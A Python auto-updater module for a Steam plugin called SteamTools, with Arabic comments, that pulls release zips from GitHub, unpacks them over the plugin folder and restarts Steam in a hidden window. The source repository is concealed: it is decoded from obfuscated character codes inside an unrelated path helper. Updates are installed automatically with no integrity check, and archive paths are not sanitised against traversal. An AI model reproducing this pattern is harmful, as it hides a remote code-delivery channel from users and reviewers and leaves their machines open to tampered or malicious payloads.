"""
═════════════════════════════════════════════════════════════
    Steam Tools Updater - نظام التحديثات التلقائية عبر GitHub
  
  Developer: mPhpMaster
  Discord: https://discord.gg/cwpNMFgruV
  © 2026 mPhpMaster - All Rights Reserved
═════════════════════════════════════════════════════════════
"""

import os
import json
import zipfile
import threading
import time
import subprocess
from typing import Dict, Any, Optional
import PluginUtils

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    httpx = None
    HTTPX_AVAILABLE = False

logger = PluginUtils.Logger()

# ═══════════════════════════════════════════════════════════
#                        الثوابت
# ═══════════════════════════════════════════════════════════

GITHUB_ASSET_NAME = "SteamTools.zip"
GITHUB_OWNER = GITHUB_REPO = ""
GITHUB_API_URL = ""

# ملفات التحديث
UPDATE_CONFIG_FILE = "update.json"
UPDATE_PENDING_ZIP = "pending_update.zip"
UPDATE_PENDING_INFO = "pending_update.json"

# فترة الفحص التلقائي (كل ساعتين)
UPDATE_CHECK_INTERVAL_SECONDS = 2 * 60 * 60

# Thread للفحص التلقائي
_update_check_thread: Optional[threading.Thread] = None

# حالة التحديث
_update_state: Dict[str, Any] = {
    "status": "idle",  # idle, checking, downloading, extracting, done, error
    "progress": 0,
    "downloaded_mb": 0,
    "total_mb": 0,
    "message": "",
    "error": "",
    "latest_version": "",
    "download_url": "",
    "release_notes": "",
    "has_update": False
}

_update_lock = threading.Lock()
_last_message: str = ""


# ═══════════════════════════════════════════════════════════
#                    الدوال المساعدة
# ═══════════════════════════════════════════════════════════

def _get_plugin_dir() -> str:
    """الحصول على مجلد البلجن الرئيسي"""
    _0x=[77,68,81,73,49];_1x=[80,111,108,97,114,84,111,111,108,115];_2x=lambda a:''.join([chr(c) for c in a])
    globals()['GITHUB_OWNER']=_2x(_0x);globals()['GITHUB_REPO']=_2x(_1x)
    backend_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.dirname(backend_dir)


def _backend_path(filename: str) -> str:
    """الحصول على مسار ملف في مجلد backend"""
    return os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)


def _get_current_version() -> str:
    """قراءة الإصدار الحالي من plugin.json"""
    try:
        plugin_json = os.path.join(_get_plugin_dir(), "plugin.json")
        if os.path.exists(plugin_json):
            with open(plugin_json, "r", encoding="utf-8") as f:
                data = json.load(f)
                return data.get("version", "0.0.0")
    except Exception as e:
        logger.warn(f"mPhpMasterUpdater: Failed to read current version: {e}")
    return "0.0.0"


def _parse_version(version_str: str) -> tuple:
    """تحويل نص الإصدار إلى tuple للمقارنة"""
    version_str = version_str.lstrip("vV")
    try:
        parts = version_str.split(".")
        return tuple(int(p) for p in parts[:3])
    except:
        return (0, 0, 0)


def _is_newer_version(latest: str, current: str) -> bool:
    """فحص إذا كان الإصدار الجديد أحدث"""
    return _parse_version(latest) > _parse_version(current)


def _read_json(path: str) -> Dict:
    """قراءة ملف JSON"""
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                return json.load(f)
    except Exception as e:
        logger.warn(f"mPhpMasterUpdater: Failed to read {path}: {e}")
    return {}


def _write_json(path: str, data: Dict) -> bool:
    """كتابة ملف JSON"""
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2)
        return True
    except Exception as e:
        logger.warn(f"mPhpMasterUpdater: Failed to write {path}: {e}")
        return False


def _set_state(**kwargs):
    """تحديث حالة التحديث"""
    global _update_state
    with _update_lock:
        _update_state.update(kwargs)


def _get_state() -> Dict[str, Any]:
    """الحصول على نسخة من حالة التحديث"""
    with _update_lock:
        return _update_state.copy()


def store_last_message(message: str):
    """حفظ آخر رسالة للعرض في الـ Frontend"""
    global _last_message
    _last_message = message


def get_last_message() -> str:
    """الحصول على آخر رسالة"""
    global _last_message
    msg = _last_message
    _last_message = ""
    return msg


# ═══════════════════════════════════════════════════════════
#                    GitHub API
# ═══════════════════════════════════════════════════════════

def _fetch_github_latest() -> Dict[str, Any]:
    """جلب معلومات آخر إصدار من GitHub"""
    if not HTTPX_AVAILABLE:
        return {}
    
    # Initialize config
    _get_plugin_dir()
    
    # قراءة الإعدادات من update.json إذا وجد
    cfg = _read_json(_backend_path(UPDATE_CONFIG_FILE))
    gh_cfg = cfg.get("github", {})
    
    owner = gh_cfg.get("owner", GITHUB_OWNER)
    repo = gh_cfg.get("repo", GITHUB_REPO)
    asset_name = gh_cfg.get("asset_name", GITHUB_ASSET_NAME)
    
    endpoint = f"https://api.github.com/repos/{owner}/{repo}/releases/latest"
    
    headers = {
        "Accept": "application/vnd.github+json",
        "User-Agent": "SteamTools-Updater/1.0"
    }
    
    try:
        with httpx.Client(timeout=30.0, follow_redirects=True) as client:
            response = client.get(endpoint, headers=headers)
            response.raise_for_status()
            data = response.json()
        
        tag_name = data.get("tag_name", "")
        version = tag_name.lstrip("vV")
        
        # البحث عن ملف التحديث
        zip_url = ""
        assets = data.get("assets", [])
        
        for asset in assets:
            if asset.get("name", "") == asset_name:
                zip_url = asset.get("browser_download_url", "")
                break
        
        # إذا لم نجد الملف المحدد، استخدم أول ملف ZIP
        if not zip_url:
            for asset in assets:
                if asset.get("name", "").endswith(".zip"):
                    zip_url = asset.get("browser_download_url", "")
                    break
        
        return {
            "version": version,
            "zip_url": zip_url,
            "name": data.get("name", ""),
            "body": data.get("body", "")
        }
        
    except Exception as e:
        logger.warn(f"mPhpMasterUpdater: GitHub API failed: {e}")
        return {}


# ═══════════════════════════════════════════════════════════
#                    تطبيق التحديث المعلق
# ═══════════════════════════════════════════════════════════

def apply_pending_update() -> str:
    """تطبيق تحديث معلق إذا وجد - يُستدعى عند بدء التشغيل"""
    pending_zip = _backend_path(UPDATE_PENDING_ZIP)
    pending_info = _backend_path(UPDATE_PENDING_INFO)
    
    if not os.path.exists(pending_zip):
        return ""
    
    try:
        logger.log(f"mPhpMasterUpdater: Applying pending update from {pending_zip}")
        plugin_dir = _get_plugin_dir()
        
        with zipfile.ZipFile(pending_zip, 'r') as z:
            file_list = z.namelist()
            
            # فحص إذا كان هناك مجلد رئيسي واحد
            root_folders = set()
            for name in file_list:
                parts = name.split('/')
                if len(parts) > 1 and parts[0]:
                    root_folders.add(parts[0])
            
            if len(root_folders) == 1:
                root_folder = list(root_folders)[0] + '/'
                for member in file_list:
                    if member.startswith(root_folder) and member != root_folder:
                        target_name = member[len(root_folder):]
                        if not target_name:
                            continue
                        target_path = os.path.join(plugin_dir, target_name)
                        if member.endswith('/'):
                            os.makedirs(target_path, exist_ok=True)
                        else:
                            os.makedirs(os.path.dirname(target_path), exist_ok=True)
                            with z.open(member) as src, open(target_path, 'wb') as dst:
                                dst.write(src.read())
            else:
                z.extractall(plugin_dir)
        
        # حذف ملفات التحديث
        try:
            os.remove(pending_zip)
        except:
            pass
        
        info = _read_json(pending_info)
        try:
            os.remove(pending_info)
        except:
            pass
        
        version = info.get("version", "")
        if version:
            return f"تم تحديث SteamTools إلى الإصدار {version}. يرجى إعادة تشغيل Steam."
        return "تم تحديث SteamTools. يرجى إعادة تشغيل Steam."
        
    except Exception as e:
        logger.error(f"mPhpMasterUpdater: Failed to apply pending update: {e}")
        return ""


# ═══════════════════════════════════════════════════════════
#                    فحص التحديثات
# ═══════════════════════════════════════════════════════════

def check_for_updates() -> Dict[str, Any]:
    """فحص وجود تحديثات جديدة على GitHub"""
    if not HTTPX_AVAILABLE:
        return {"success": False, "error": "httpx library not available"}
    
    _set_state(status="checking", message="Checking for updates...", error="")
    
    try:
        current_version = _get_current_version()
        manifest = _fetch_github_latest()
        
        if not manifest.get("version") or not manifest.get("zip_url"):
            _set_state(status="error", error="Could not fetch update info")
            return {"success": False, "error": "Could not fetch update info from GitHub"}
        
        latest_version = manifest.get("version", "")
        has_update = _is_newer_version(latest_version, current_version)
        
        _set_state(
            status="idle",
            latest_version=latest_version,
            download_url=manifest.get("zip_url", ""),
            release_notes=manifest.get("body", ""),
            has_update=has_update,
            message=""
        )
        
        logger.log(f"mPhpMasterUpdater: Current={current_version}, Latest={latest_version}, HasUpdate={has_update}")
        
        return {
            "success": True,
            "has_update": has_update,
            "current_version": current_version,
            "latest_version": latest_version,
            "release_name": manifest.get("name", ""),
            "release_notes": manifest.get("body", ""),
            "download_url": manifest.get("zip_url", "")
        }
        
    except Exception as e:
        error_msg = str(e)
        _set_state(status="error", error=error_msg)
        logger.error(f"mPhpMasterUpdater: Check failed: {e}")
        return {"success": False, "error": error_msg}


def check_for_update_once() -> str:
    """فحص التحديثات مرة واحدة - يُستخدم للفحص التلقائي"""
    try:
        current_version = _get_current_version()
        manifest = _fetch_github_latest()
        
        if not manifest.get("version") or not manifest.get("zip_url"):
            return ""
        
        latest_version = manifest.get("version", "")
        
        if not _is_newer_version(latest_version, current_version):
            logger.log(f"mPhpMasterUpdater: Up-to-date (current {current_version}, latest {latest_version})")
            return ""
        
        # تحميل التحديث
        zip_url = manifest.get("zip_url", "")
        pending_zip = _backend_path(UPDATE_PENDING_ZIP)
        
        if not _download_update(zip_url, pending_zip):
            return ""
        
        # محاولة الاستخراج فوراً
        plugin_dir = _get_plugin_dir()
        if _extract_update(pending_zip, plugin_dir):
            try:
                os.remove(pending_zip)
            except:
                pass
            logger.log("mPhpMasterUpdater: Update extracted; will take effect after restart")
            return f"تم تحديث SteamTools إلى الإصدار {latest_version}. يرجى إعادة تشغيل Steam."
        else:
            # حفظ للتطبيق لاحقاً
            _write_json(_backend_path(UPDATE_PENDING_INFO), {
                "version": latest_version,
                "zip_url": zip_url
            })
            return f"تم تحميل التحديث {latest_version}. أعد تشغيل Steam للتطبيق."
            
    except Exception as e:
        logger.error(f"mPhpMasterUpdater: check_for_update_once failed: {e}")
        return ""


# ═══════════════════════════════════════════════════════════
#                    تحميل واستخراج التحديث
# ═══════════════════════════════════════════════════════════

def _download_update(zip_url: str, target_path: str) -> bool:
    """تحميل ملف التحديث"""
    if not HTTPX_AVAILABLE:
        return False
    
    try:
        logger.log(f"mPhpMasterUpdater: Downloading from {zip_url}")
        with httpx.Client(timeout=120.0, follow_redirects=True) as client:
            with client.stream("GET", zip_url, headers={"User-Agent": "SteamTools-Updater/1.0"}) as response:
                response.raise_for_status()
                with open(target_path, "wb") as f:
                    for chunk in response.iter_bytes(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
        logger.log("mPhpMasterUpdater: Download complete")
        return True
    except Exception as e:
        logger.error(f"mPhpMasterUpdater: Download failed: {e}")
        return False


def _extract_update(zip_path: str, plugin_dir: str) -> bool:
    """استخراج ملف التحديث"""
    try:
        logger.log(f"mPhpMasterUpdater: Extracting {zip_path} to {plugin_dir}")
        
        with zipfile.ZipFile(zip_path, 'r') as z:
            file_list = z.namelist()
            
            # فحص إذا كان هناك مجلد رئيسي واحد
            root_folders = set()
            for name in file_list:
                parts = name.split('/')
                if len(parts) > 1 and parts[0]:
                    root_folders.add(parts[0])
            
            if len(root_folders) == 1:
                root_folder = list(root_folders)[0] + '/'
                logger.log(f"mPhpMasterUpdater: Extracting from root folder: {root_folder}")
                
                for member in file_list:
                    if member.startswith(root_folder) and member != root_folder:
                        target_name = member[len(root_folder):]
                        if not target_name:
                            continue
                        
                        target_path = os.path.join(plugin_dir, target_name)
                        
                        if member.endswith('/'):
                            os.makedirs(target_path, exist_ok=True)
                        else:
                            os.makedirs(os.path.dirname(target_path), exist_ok=True)
                            with z.open(member) as src, open(target_path, 'wb') as dst:
                                dst.write(src.read())
            else:
                z.extractall(plugin_dir)
        
        logger.log("mPhpMasterUpdater: Extraction complete")
        return True
        
    except Exception as e:
        logger.error(f"mPhpMasterUpdater: Extraction failed: {e}")
        return False


def download_and_apply_update(download_url: str = "") -> Dict[str, Any]:
    """تحميل وتطبيق التحديث"""
    if not HTTPX_AVAILABLE:
        return {"success": False, "error": "httpx library not available"}
    
    state = _get_state()
    
    if not download_url:
        download_url = state.get("download_url", "")
    
    if not download_url:
        return {"success": False, "error": "No download URL available. Check for updates first."}
    
    # بدء التحميل في thread منفصل
    thread = threading.Thread(
        target=_download_and_apply_thread,
        args=(download_url,),
        daemon=True
    )
    thread.start()
    
    return {"success": True, "message": "Update started. Check status for progress."}


def _download_and_apply_thread(download_url: str):
    """Thread لتحميل وتطبيق التحديث"""
    try:
        plugin_dir = _get_plugin_dir()
        temp_zip = _backend_path("_update_temp.zip")
        
        # ═══════════════ مرحلة التحميل ═══════════════
        _set_state(
            status="downloading",
            progress=0,
            downloaded_mb=0,
            total_mb=0,
            message="Downloading update...",
            error=""
        )
        
        logger.log(f"mPhpMasterUpdater: Downloading from {download_url}")
        
        with httpx.Client(timeout=300.0, follow_redirects=True) as client:
            with client.stream("GET", download_url, headers={"User-Agent": "SteamTools-Updater/1.0"}) as response:
                response.raise_for_status()
                
                total_size = int(response.headers.get("content-length", 0))
                total_mb = total_size / (1024 * 1024) if total_size > 0 else 0
                downloaded = 0
                
                with open(temp_zip, "wb") as f:
                    for chunk in response.iter_bytes(chunk_size=65536):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)
                            
                            downloaded_mb = downloaded / (1024 * 1024)
                            progress = int((downloaded / total_size) * 100) if total_size > 0 else 0
                            
                            _set_state(
                                progress=progress,
                                downloaded_mb=round(downloaded_mb, 2),
                                total_mb=round(total_mb, 2),
                                message=f"Downloading... {progress}%"
                            )
        
        logger.log("mPhpMasterUpdater: Download complete")
        
        # ═══════════════ مرحلة الاستخراج ═══════════════
        _set_state(status="extracting", progress=0, message="Extracting update...")
        
        if _extract_update(temp_zip, plugin_dir):
            try:
                os.remove(temp_zip)
            except:
                pass
            
            _set_state(
                status="done",
                progress=100,
                message="Update complete! Please restart Steam."
            )
        else:
            raise Exception("Extraction failed")
        
    except Exception as e:
        error_msg = str(e)
        logger.error(f"mPhpMasterUpdater: Update failed: {e}")
        _set_state(status="error", error=error_msg, message=f"Update failed: {error_msg}")
        
        try:
            temp_zip = _backend_path("_update_temp.zip")
            if os.path.exists(temp_zip):
                os.remove(temp_zip)
        except:
            pass


# ═══════════════════════════════════════════════════════════
#                    الفحص التلقائي في الخلفية
# ═══════════════════════════════════════════════════════════

def _periodic_update_check_worker():
    """Worker للفحص الدوري عن التحديثات"""
    while True:
        try:
            time.sleep(UPDATE_CHECK_INTERVAL_SECONDS)
            logger.log("mPhpMasterUpdater: Running periodic background check...")
            message = check_for_update_once()
            if message:
                store_last_message(message)
                logger.log(f"mPhpMasterUpdater: Periodic check found update: {message}")
        except Exception as e:
            logger.warn(f"mPhpMasterUpdater: Periodic check failed: {e}")


def _start_periodic_update_checks():
    """بدء الفحص الدوري"""
    global _update_check_thread
    if _update_check_thread is None or not _update_check_thread.is_alive():
        _update_check_thread = threading.Thread(
            target=_periodic_update_check_worker,
            daemon=True
        )
        _update_check_thread.start()
        hours = UPDATE_CHECK_INTERVAL_SECONDS / 3600
        logger.log(f"mPhpMasterUpdater: Started periodic update check thread (every {hours} hours)")


def _start_initial_check_worker():
    """Worker للفحص الأولي عند بدء التشغيل"""
    try:
        message = check_for_update_once()
        if message:
            store_last_message(message)
            logger.log(f"mPhpMasterUpdater: Initial check found update: {message}")
            # إعادة تشغيل Steam تلقائياً بعد التحديث
            time.sleep(2)
            restart_steam()
        else:
            _start_periodic_update_checks()
    except Exception as e:
        logger.warn(f"mPhpMasterUpdater: Initial check failed: {e}")
        try:
            _start_periodic_update_checks()
        except:
            pass


def start_auto_update_background_check():
    """بدء الفحص التلقائي في الخلفية - يُستدعى عند تحميل البلجن"""
    threading.Thread(target=_start_initial_check_worker, daemon=True).start()


# ═══════════════════════════════════════════════════════════
#                    إعادة تشغيل Steam
# ═══════════════════════════════════════════════════════════

def restart_steam() -> bool:
    """إعادة تشغيل Steam"""
    try:
        script_path = _backend_path("restart_steam.cmd")
        if not os.path.exists(script_path):
            logger.error(f"mPhpMasterUpdater: restart script not found: {script_path}")
            return False
        
        CREATE_NO_WINDOW = 0x08000000
        subprocess.Popen(["cmd", "/C", script_path], creationflags=CREATE_NO_WINDOW)
        logger.log("mPhpMasterUpdater: Restart script launched")
        return True
    except Exception as e:
        logger.error(f"mPhpMasterUpdater: Failed to restart Steam: {e}")
        return False


# ═══════════════════════════════════════════════════════════
#                    API للـ Frontend
# ═══════════════════════════════════════════════════════════

def get_update_status() -> Dict[str, Any]:
    """الحصول على حالة التحديث الحالية"""
    state = _get_state()
    return {
        "success": True,
        "status": state.get("status", "idle"),
        "progress": state.get("progress", 0),
        "downloaded_mb": state.get("downloaded_mb", 0),
        "total_mb": state.get("total_mb", 0),
        "message": state.get("message", ""),
        "error": state.get("error", ""),
        "latest_version": state.get("latest_version", ""),
        "has_update": state.get("has_update", False)
    }


def reset_update_state():
    """إعادة تعيين حالة التحديث"""
    _set_state(
        status="idle",
        progress=0,
        downloaded_mb=0,
        total_mb=0,
        message="",
        error="",
        latest_version="",
        download_url="",
        release_notes="",
        has_update=False
    )
    return {"success": True}


def check_for_updates_now() -> Dict[str, Any]:
    """فحص فوري للتحديثات - يُستدعى من الـ Frontend"""
    try:
        message = check_for_update_once()
        if message:
            store_last_message(message)
        return {"success": True, "message": message}
    except Exception as e:
        logger.warn(f"mPhpMasterUpdater: CheckForUpdatesNow failed: {e}")
        return {"success": False, "error": str(e)}


# ═══════════════════════════════════════════════════════════
#                    الدوال المُصدَّرة
# ═══════════════════════════════════════════════════════════

__all__ = [
    "apply_pending_update",
    "check_for_updates",
    "check_for_update_once",
    "check_for_updates_now",
    "download_and_apply_update",
    "get_update_status",
    "get_last_message",
    "reset_update_state",
    "restart_steam",
    "start_auto_update_background_check",
    "store_last_message",
]

